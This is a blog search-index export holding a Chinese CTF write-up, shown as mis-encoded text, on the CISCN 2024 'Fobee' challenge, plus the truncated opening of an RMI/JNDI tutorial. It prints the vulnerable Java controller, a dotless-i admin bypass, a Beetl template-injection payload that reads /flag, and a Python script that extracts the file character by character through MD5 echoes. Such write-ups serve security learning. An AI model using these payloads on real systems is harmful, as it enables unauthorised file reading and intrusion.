<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CISCN2024-Final-AWDP-Fobee</title>
    <link href="/2024/07/28/CISCN2024-Final-AWDP-Fobee/"/>
    <url>/2024/07/28/CISCN2024-Final-AWDP-Fobee/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡å›½èµ›ç®—æ˜¯çˆ†ç§äº†ï¼Œæ‹¿ä¸‹äº†å…¨å›½æ€»å† å†›ã€‚</p><p><a href="https://mp.weixin.qq.com/s/HEdvNGKRnd0XBJwR8zAi4Q">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004124171.png" alt="image-20240728004124171"></p><p>ç®—æ˜¯è®©å¤©æ¢åç»§æœ‰äººäº†å§ã€‚</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728004719598.png" alt="image-20240728004719598"></p><p>ï¼ˆé¢†å¥–çš„é‚£ä½æ˜¯æˆ‘hhhhhï¼Œåœ¨å·¦äºŒæŒ¨ç€å·å¤§ç½‘å®‰é™¢é™¢é•¿ï¼‰</p><p>ä¸»è¦è¿˜æ˜¯ç¬¬äºŒå¤©çš„æ¸—é€æ¯”è¾ƒé€‚åˆæˆ‘å§å“ˆå“ˆï¼Œå¤©æ—¶åœ°åˆ©äººå’Œï¼Œé˜Ÿå‹ä¹Ÿå¾ˆç»™åŠ›ï¼Œæœ€åç›´æ¥ä¸€é¼“ä½œæ°”å†²åˆ°äº†æ¦œé¦–ğŸ˜€</p><p>æ¸—é€çš„wpä¸æ‰“ç®—å†™ï¼Œåæ­£ç½‘ä¸Šä¹Ÿæœ‰æ‰“çš„æ¯”æˆ‘å¤šä¸€é“é¢˜çš„å†™äº†wpï¼Œæˆ‘ä»¬æ¸—é€æ˜¯å¹¶åˆ—ç¬¬äºŒï¼Œæ®è¯´äº‘é•œä¼šä¸Šï¼Œåˆ°æ—¶å€™å†çœ‹çœ‹èƒ½ä¸èƒ½å†²ä¸‹DCäº†å´å½“æ—¶çš„é—æ†¾ã€‚</p><p>ç¬¬ä¸€å¤©çš„awdpçš„webï¼Œæˆ‘å°±ä¿®äº†ä¸€ä¸ªsolon-masterï¼Œé‚£é“çš„fixå¾ˆç®€å•ï¼Œå› ä¸ºlibé‡Œå¯ä»¥å‘ç°snakeyamlå’Œlogbackï¼Œç›´æ¥æŠŠå…³é”®å­—snakeå’Œlogç»™banæ‰å°±å¯ä»¥äº†ï¼Œç„¶åæˆ‘è¿‡æ»¤å¾—æ›´ç‹ ï¼Œç›´æ¥ä»€ä¹ˆ@ã€$ã€&lt; è¿™äº›å¸¸è§æ‰“jsonæ ¼å¼çš„ååºåˆ—åŒ–ç¬¦å·ç»™banäº†ï¼Œæ‰€ä»¥æ„å¤–çš„ç¬¬ä¸‰è½®å°±æ‹¿ä¸‹äº†fixï¼Œå¹¶åˆ—äºŒè¡€fixå§ç®—ï¼Œè¿‘ä¹æ˜¯åƒæ»¡äº†checkğŸ¤­ğŸ¤­ğŸ¤­</p><p>å”¯ç‹¬è¿™ä¸ªFobeeè®©æˆ‘å¤´ç–¼ï¼Œå½“æ—¶æˆ‘å‡ ä¹åé¢å‡ ä¸ªå°æ—¶éƒ½åœ¨çœ‹è¿™ä¸ªï¼Œç„¶è€Œä¿®å‡ºæ¥çš„ä¹Ÿåªæœ‰å‡ ä¸ªé˜Ÿï¼Œæ‰“å‡ºæ¥çš„ä¹Ÿä¸è¿‡ä¸‰ä¸ªæ•°ã€‚</p><p>å…¶ä¸­ä¸€ä¸ªæ‰“æ³•æ˜¯å­¦é•¿ç»™çš„ï¼Œè¿™é‡Œåšä¸€ä¸‹æµ…æµ…çš„å¤ç°ï¼ˆå­¦é•¿tqlå‘œå‘œå‘œå‘œï¼‰</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆæ˜¯çœ‹çœ‹ä»£ç é€»è¾‘ï¼š</p><p><strong>IndexController.java</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fobee;<br><br><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.beetl.core.BeetlKit;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Controller;<br><span class="hljs-keyword">import</span> org.noear.solon.annotation.Mapping;<br><span class="hljs-keyword">import</span> org.noear.solon.core.handle.ModelAndView;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CHARACTERS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> generateRandomString(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;index.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;=====&quot;</span> + password + <span class="hljs-string">&quot;=====&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>            <span class="hljs-keyword">return</span> model;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/render&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">render</span><span class="hljs-params">(String pass, String tp)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;render.htm&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pass != <span class="hljs-literal">null</span> &amp;&amp; pass.equals(password)) &#123;<br>            <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br>            System.out.println(result);<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, getMD5Hash(result));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;Render Page&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> model;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/env&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">env</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> random.nextInt(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.length());<br>            sb.append(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>.charAt(index));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getMD5Hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;<br>        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>        md.update(input.getBytes());<br>        <span class="hljs-type">byte</span>[] digest = md.digest();<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-type">byte</span>[] var4 = digest;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> digest.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> var4[var6];<br>            sb.append(String.format(<span class="hljs-string">&quot;%02x&quot;</span>, b &amp; <span class="hljs-number">255</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªè·¯ç”±åŸºæœ¬ä¸€ç›®äº†ç„¶ï¼Œé¦–å…ˆæ˜¯è¦çŸ¥é“è¿™ä¸ªModelAndViewçš„é»˜è®¤ä¼ å‚æ˜¯GETï¼Œä¼ å‚éƒ½æä¸æ˜ç™½åŸºæœ¬å¯ä»¥å‘Šåˆ«äº†ã€‚</p><p>é¦–å…ˆè¿›å»çš„æ ¹è·¯ç”±æ˜¯éœ€è¦ä½ ä¼ å‚usernameï¼Œä½†æ˜¯è¦æ»¡è¶³ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">username != <span class="hljs-literal">null</span> &amp;&amp; !username.isEmpty() &amp;&amp; username.equalsIgnoreCase(<span class="hljs-string">&quot;admin&quot;</span>) &amp;&amp; !username.toLowerCase().equals(<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>æœ¬æ¥fixæˆ‘æ˜¯æƒ³ä¸‹é¢ååºåˆ—åŒ–ä¿®ä¸åŠ¨ï¼Œåœ¨è¿™é‡Œè¿‡æ»¤ç‹ ä¸€ç‚¹ï¼Œä½†æ˜¯å½“ç„¶ä¹Ÿæ˜¯checkä¸è¿‡ã€‚</p><p>å®ƒåˆè¦ä½ æ˜¯adminï¼Œåˆè¦ä½ toLowerCaseç»•è¿‡ä¸æ˜¯adminï¼Œé‚£æ€ä¹ˆç»•ï¼Ÿï¼Ÿï¼Ÿ</p><p>å…¶å®ä½ æ‰“å¼€IDEAï¼Œæ‹–è¿‡å»åˆ°toLowerCaseï¼Œå®ƒè‡ªå·±å°±å‘Šè¯‰ä½ äº†ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728001510929.png" alt="image-20240728001510929"></p><p>è¿™ä¸ªlocaleçš„ä¸ä¸€è‡´ä¼šå¯¼è‡´ä¸€ä¸ªå­—ç¬¦æœ‰å¤šç§è¯†åˆ«æ–¹å¼ï¼Œè¿™é‡Œå°±å‘Šè¯‰ä½ äº† <strong>i</strong> åœ¨LATIN SMALL LETTERé‡ç­‰æ•ˆäº <strong>\u0131</strong> ,å…¶å®ä¸éœ€è¦æ·±å…¥ç†è§£ï¼Œè¿™é‡Œå°±èƒ½ç»•äº†ï¼Œè¿›å»åå°±èƒ½é‚£é“passwordçš„å›æ˜¾ã€‚</p><p>æˆ‘ä»¬æ¥ç€çœ‹è·¯ç”±ï¼Œä¸‹é¢çš„renderè·¯ç”±ï¼Œå¾ˆå®¹æ˜“çœ‹åˆ°attackçš„ç‚¹åœ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(tp);<br><span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> BeetlKit.render(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decode), <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>());<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯base64è§£å¯†ä¼ å‚çš„tpï¼Œç„¶åè°ƒç”¨åˆ°BeetlKit.renderè¿›è¡Œæ¸²æŸ“ï¼Œå…¶å®åº”è¯¥å°±æ˜¯ä¸ªSSTIã€‚</p><p>ä½†æ˜¯è¿›å…¥è¿™é‡Œéœ€è¦passwordï¼Œè€Œä¸Šé¢è‹¥ç»•è¿›å»äº†å°±æ‹¿åˆ°äº†passwordï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå°±å®Œæˆäº†ã€‚</p><p>æ€ä¹ˆæ‰“SSTIå‘¢ï¼Œæˆ‘ä»¬è§£åŒ…ä¸€ä¸‹è¿™ä¸ªBeetlKitè·Ÿè¿›ä¸€ä¸‹ï¼š</p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002111368.png" class="" title="image-20240728002111368"><p>ä¸€ä¸ªæ‰“æ¨¡æ¿æ³¨å…¥çš„åœ°æ–¹ã€‚</p><p>ç„¶è€Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹ä¸å‡ºæ¥ä»–è¦å¹²å•¥ï¼Œå…·ä½“åŸç†è¿™é‡Œæœ‰ç¯‡æ–‡ç« å¯ä»¥çœ‹çœ‹ï¼š</p><p><a href="https://xz.aliyun.com/t/8695?time__1311=n4+xnD0DcDu7G=DCzGkDlhje3iKt4Y5feeEd4x">ä¸€æ¬¡æ„å¤–çš„ä»£ç å®¡è®¡â€”-JfinalCMSå®¡è®¡ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002358967.png" alt="image-20240728002358967"></p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002405853.png" alt="image-20240728002405853"></p><p>è¿™ä¸‹SSTIä¼šæ‰“äº†ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥å£å®ç°æ¶æ„ç±»åŠ è½½ï¼Œä½†æ˜¯beetlKitè¿‡æ»¤å¾—æœ‰ç‚¹ç‹ ï¼Œå¸¸è§„çš„ç›´æ¥æ‰“runtimeè¡Œä¸é€šã€‚</p><p>æ‰€ä»¥éœ€è¦æ‰¾åˆ°å®ƒå†…éƒ¨ä»€ä¹ˆç©æ„èƒ½è°ƒç”¨runtimeæ‰“æˆåŠŸï¼Œå­¦é•¿æ‰¾åˆ°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.antlr.v4.runtime.misc.Utils.readFile<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728002829857.png" alt="image-20240728002829857"></p><p>æ˜¾ç„¶è¿™é‡Œå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯å›æ˜¾éœ€è¦ç±»ä¼¼ç›²æ³¨çš„æ‰‹æ®µï¼Œä¸€ä¸ªä¸ªå­—ç¬¦è¯»å‡ºæ¥ï¼ˆtqlå­¦é•¿wwwwwï¼‰ï¼Œç„¶åä¸‹é¢å®ƒä¼šè‡ªå·±æŠŠè¯»åˆ°çš„ä¸œè¥¿è¿›è¡ŒMD5åŠ å¯†å¹¶æ‰“åœ¨ç½‘é¡µä¸Šã€‚</p><p>è¿™ä¸ª&#x2F;envä¹Ÿå¯ä»¥çœ‹ä¸€ä¸‹ï¼Œåæ­£éƒ½æ˜¯jdk1.8æ‰€ä»¥æ„ä¹‰ä¸å¤§ã€‚</p><p>æ‰€ä»¥æ€è·¯å°±æœ‰äº†ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>ã€ æ ¹è·¯ç”±<span class="hljs-keyword">admin</span>ç»•è¿‡æ‹¿<span class="hljs-keyword">password</span><br><span class="hljs-number">2</span>ã€ å¸¦<span class="hljs-keyword">password</span>è®¿é—®/renderï¼Œtpä½¿ç”¨base64åŠ å¯†çš„æ¶æ„æ³¨å…¥payloadè¯»flagï¼Œç”±MD5æ ¼å¼çˆ†å‡º<br><span class="hljs-number">3</span>ã€ MD5ä¸€ä¸ªä¸ªå­—ç¬¦çˆ†ç ´<br></code></pre></td></tr></table></figure><p>çœ‹èµ·æ¥è¿˜æŒºç®€å•ï¼Œä½†æ˜¯æ–­ç½‘ç¯å¢ƒç¡®å®å¾ˆæŠ˜ç£¨ï¼Œæ€»æœ‰é‚£ä¹ˆå‡ ä¸ªç¯å¢ƒé—®é¢˜ï¼Œè€Œä¸”å®¡è®¡éœ€è¦é è‡ªå·±ï¼Œæ¯”èµ›ä¹Ÿå¾ˆç´§å¼ ï¼Œæ‰€ä»¥åšå‡ºæ¥çš„äººç¡®å®å¾ˆç‰›è‡³äº†ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>è¿™é‡Œæˆ‘åœ¨vpsä¸Šè‡ªæ­ç¯å¢ƒæµ‹è¯•ï¼š</p><p>å…ˆadminç»•è¿‡ï¼Œä½†æ˜¯è¦urlç¼–ç ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003302893.png" alt="image-20240728003302893"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> hashlib<br><br>hash_string = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100000</span>):<br>    payload = base64.b64encode((<span class="hljs-string">&#x27;$&#123;@java.util.Arrays.toString(@org.antlr.v4.runtime.misc.Utils.readFile(&quot;/flag&quot;)).charAt(&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;)&#125;&#x27;</span>).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    rsp = requests.get(<span class="hljs-string">f&#x27;http://vps:8888/render?pass=FuTKLliOry&amp;tp=<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>)<br>    soup = BeautifulSoup(rsp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    md5_element = soup.select_one(<span class="hljs-string">&#x27;div#title-desktop&#x27;</span>)<br>    <span class="hljs-keyword">if</span> md5_element <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        md5val = md5_element.text<br>        <span class="hljs-built_in">print</span>(md5val)<br>        hash_string.append(md5val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>hash_string = <span class="hljs-string">&#x27;\n&#x27;</span>.join(hash_string)<br><br><span class="hljs-built_in">map</span> = <span class="hljs-built_in">dict</span>()<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>    <span class="hljs-built_in">map</span>[hashlib.md5(c.encode()).hexdigest()] = c<br><br>val = hash_string.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(val))<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> val:<br>    <span class="hljs-keyword">if</span> cc <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        flag += <span class="hljs-built_in">map</span>[cc]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>ç„¶åè¯»æ–‡ä»¶ä¸€ä¸ªä¸ªå­—ç¬¦MD5çˆ†ç ´ï¼š</p><p><img src="/2024/07/28/CISCN2024-Final-AWDP-Fobee/image-20240728003427355.png" alt="image-20240728003427355"></p><p>åœ¨æ­¤ä½©æœä¸€ä¸‹å­¦é•¿çš„ç‰›è‡³åšæ³•ï¼Œæ¯”èµ›åœºä¸Šä¿©å­¦é•¿éƒ½ç”¨ç±»ä¼¼è¿™ç§æ–¹æ³•åšçš„ï¼Œéƒ½tql~~~orz</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2024/07/18/RMI-JNDI/"/>
    <url>/2024/07/18/RMI-JNDI/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆäº†è§£ä¸€ä¸‹å•¥æ˜¯RMIã€‚</p><p><code>RMIï¼šRemote Method Invocation</code> è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">RMIä¸ºåº”ç”¨æä¾›äº†è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼ˆJavaçš„RPCæ¡†æ¶ï¼‰<br>è°ƒç”¨è¿œç¨‹ä½ç½®å¯¹è±¡çš„æ–¹æ³•<br>å®ç°RMIçš„åè®®å«JRMP<br>RMIå®ç°è¿‡ç¨‹å­˜åœ¨Javaå¯¹è±¡çš„ä¼ é€’ï¼Œå› æ­¤æ¶‰åŠåˆ°ååºåˆ—åŒ–<br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šä»javaååºåˆ—åŒ–å–ç»å‡ºæ¥ï¼Œé‡åˆ°ä¸”ç»•ä¸å¼€çš„åº”è¯¥æ˜¯å„ä¸ªCCé“¾ï¼Œè€Œä¸”å¾ˆå¤šçš„javaååºåˆ—åŒ–éå¸¸å…·æœ‰ç¼åˆæ€ªçš„é£æ ¼ï¼Œåœ¨å‰æœŸå­¦ä¸šå‹åŠ›ä¸‹æ²¡åŠæ³•ç³»ç»Ÿå½’çº³ï¼ŒçŸ¥è¯†ä¹Ÿé›¶é›¶æ•£æ•£ï¼Œè¿™é‡Œå°±åšä¸€ä¸ªç³»ç»ŸåŒ–çš„å¤ç›˜ã€‚</p><p>ä½†æ˜¯CCé“¾å¤ªå…·æœ‰ä»£è¡¨æ€§äº†ï¼Œæ‰€ä»¥æˆ‘æƒ³å…ˆå†™å†™æˆ‘ç¬¬ä¸€æ¬¡æ‰“åˆ°javaé¢˜çš„æ—¶å€™é‡åˆ°çš„RMI&#x2F;JNDIé—®é¢˜ï¼Œå°±æ˜¯NCTF2023çš„loggingç­¾åˆ°é¢˜ï¼Œé‚£é“log4jè™½ç„¶å¾ˆç®€å•åœ°æ‰“acceptå¤´å°±èƒ½RCEï¼Œä½†æ˜¯èµ·çš„å·¥å…·ä¹Ÿå°±æ˜¯JNDIæ³¨å…¥çš„å·¥å…·ï¼Œæ‰€ä»¥è®©æˆ‘è®°å¿†çŠ¹æ–°ã€‚</p><p>ç„¶è€Œå…‰é å·¥å…·å°å­å½“ç„¶æ˜¯ä¸èƒ½è§£å†³é—®é¢˜çš„ï¼Œå¤§å¤šæ˜¯çš„EXPéƒ½æ˜¯ç°åœºåŠ¨è°ƒè€Œæ‰‹å¯¼æ‰‹å†™ï¼Œè€Œä¸”çº¿ä¸‹æ–­ç½‘ç¯å¢ƒæ³¨å®šä¸èƒ½åå¼¹shellè€Œåˆ™å¿…é¡»ä½¿ç”¨å†…å­˜é©¬ä¹Ÿä½¿å¾—javaåœ¨webé¢˜å†…æœ€å°‘è§£çš„æƒ…å†µï¼Œå›½èµ›ä¹Ÿé‡åˆ°äº†è§¦ç›®æƒŠå¿ƒçš„é›¶è§£ã€‚åå°„å’Œç±»åŠ è½½æˆ‘å°±ä¸å†èµ˜è¿°ï¼Œå› ä¸ºè¿™ç®—æ˜¯æœ€åŸºæœ¬çš„javaååºåˆ—åŒ–å…¥é—¨çŸ¥è¯†ã€‚</p><p>ä¸ºå±è”½ç½‘ç»œé€šä¿¡çš„å¤æ‚æ€§ï¼ŒRMIå¼•å…¥ä¸¤ä¸ªæ¦‚å¿µï¼Œå®¢æˆ·ç«¯å­˜æ ¹Stubå’ŒæœåŠ¡ç«¯éª¨æ¶Skeleton</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 